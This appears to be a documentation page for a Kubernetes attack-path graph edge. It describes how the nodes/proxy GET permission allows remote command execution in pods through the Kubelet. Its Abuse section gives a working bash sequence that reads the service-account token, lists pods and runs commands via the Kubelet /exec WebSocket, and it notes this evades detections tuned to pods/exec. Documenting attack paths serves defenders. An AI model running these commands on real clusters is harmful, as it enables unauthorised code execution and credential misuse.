# CH_nodesProxyRCE

## Edge Schema

- **Source:** [CH_Identity](../NodeDescriptions/CH_Identity.md)
- **Target:** [CH_Cluster](../NodeDescriptions/CH_Cluster.md)

## General Information

The Identity holds the `nodes/proxy` GET permission, which can be abused to proxy requests directly to the Kubelet API on any node, facilitating RCE to all Pods on that node.

## Abuse

The `nodes/proxy` subresource proxies requests through the API server to the Kubelet (port 10250) on any node. Use the proxy to enumerate pods and extract the target node IP, then connect directly to the Kubelet to exec into any container. The Kubelet's `/exec` endpoint is reached via a WebSocket upgrade (HTTP GET), so RBAC sees a `GET nodes/proxy` and permits it — no `pods/exec` permission required. Because audit logs record this as a `nodes/proxy` GET rather than a `pods/exec` create, it is less likely to trigger detections tuned to the standard exec path.

```bash
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://kubernetes.default.svc

# Extract the node name from the SA token JWT
export NODE_NAME=$(echo "$(echo $TOKEN | cut -d. -f2)==" | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r '.["kubernetes.io"].node.name')

# List pods via the API server proxy and extract the node IP
export NODE_IP=$(wget -qO- --no-check-certificate \
  --header "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/nodes/$NODE_NAME/proxy/pods" | jq -r '.items[0].status.hostIP')

# Exec into a container directly via the Kubelet WebSocket endpoint
websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://$NODE_IP:10250/exec/<namespace>/<pod>/<container>?output=1&error=1&command=id"
```

## References

- [iximiuz - nodes/proxy RCE](https://labs.iximiuz.com/tutorials/nodes-proxy-rce-c9e436a9)
- [Kubernetes Kubelet API](https://kubernetes.io/docs/reference/node/kubelet-api/)
- [HackTricks - nodes/proxy](https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes/index.html#nodes-proxy)
- [OWASP K02 - Overly Permissive RBAC Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K02-Overly-Permissive-Authorization-Configurations.html)
